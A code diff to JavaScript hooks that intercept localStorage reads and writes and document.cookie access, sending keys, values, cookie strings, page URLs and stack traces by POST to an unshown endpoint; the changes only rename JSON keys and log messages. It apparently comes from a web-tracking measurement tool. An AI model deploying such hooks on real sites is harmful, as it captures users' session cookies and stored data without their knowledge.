@@ -7,7 +7,7 @@ window.Storage.prototype.setItem = function(keyName, keyValue) {
     method: "POST", 
     body: JSON.stringify({"top_level_url": window.location.href,
     "function":"storage_setter",
-    "storage:": {"keyName": keyName, "keyValue": keyValue},
+    "storage": {"keyName": keyName, "keyValue": keyValue},
     "stack":new Error().stack}),
     mode: 'cors',
     headers: {
@@ -15,7 +15,7 @@ window.Storage.prototype.setItem = function(keyName, keyValue) {
       "Content-Type": "application/json"
     }
   }).then(res => {
-    console.log("storage collected");
+    console.log("Localstorage collected");
   });
     originalFunction.apply(this, arguments);
     return;
@@ -27,7 +27,7 @@ window.Storage.prototype.getItem = function(keyName) {
     method: "POST", 
     body: JSON.stringify({"top_level_url": window.location.href,
     "function":"storage_getter",
-    "storage:": {keyName},
+    "storage": {keyName},
     "stack":new Error().stack}),
     mode: 'cors',
     headers: {
@@ -35,7 +35,7 @@ window.Storage.prototype.getItem = function(keyName) {
       "Content-Type": "application/json"
     }
   }).then(res => {
-    console.log("storage collected");
+    console.log("Localstorage collected");
   });
     originalFunction2.apply(this, arguments);
     return;
@@ -49,7 +49,7 @@ Object.defineProperty(document, 'cookie', {
         method: "POST", 
         body: JSON.stringify({"top_level_url": window.location.href,
         "function":"cookie_getter",
-        "cookie:": storedCookieStr,
+        "cookie": storedCookieStr,
         "stack":new Error().stack}),
         mode: 'cors',
         headers: {
@@ -66,7 +66,7 @@ Object.defineProperty(document, 'cookie', {
         method: "POST", 
         body: JSON.stringify({"top_level_url": window.location.href,
         "function":"cookie_setter",
-        "cookie:": cookieString,
+        "cookie": cookieString,
         "stack":new Error().stack}),
         mode: 'cors',
         headers: {
